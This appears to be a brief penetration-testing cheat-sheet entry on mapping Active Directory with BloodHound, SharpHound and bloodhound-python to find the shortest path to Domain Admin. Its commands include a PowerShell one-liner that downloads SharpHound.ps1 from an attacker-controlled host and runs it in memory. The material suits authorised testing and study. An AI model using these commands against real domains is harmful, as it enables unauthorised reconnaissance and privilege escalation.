# 16.01 BloodHound SharpHound

> Collect AD with `SharpHound` (C#) or `bloodhound-python` and visualize the shortest path to Domain Admin.

## Overview

Collect domain data and visualise shortest paths to Domain Admin. SharpHound (C#) runs on a domain-joined host; bloodhound-python from Kali works without domain join.

## Steps

- **Collect** — SharpHound -c All / bloodhound-python -c all.
- **Import into BloodHound UI** — drag the ZIP onto the GUI.
- **Mark owned principal**; run 'Shortest paths from owned'.
- **Iterate** as you collect more credentials.

## Commands

### Collection

```bash
# Linux
bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -ns <DC-IP> -c all --zip
# Windows (from session)
SharpHound.exe -c All,LoggedOn --zipfilename bh.zip
# In-memory PS
IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All
```
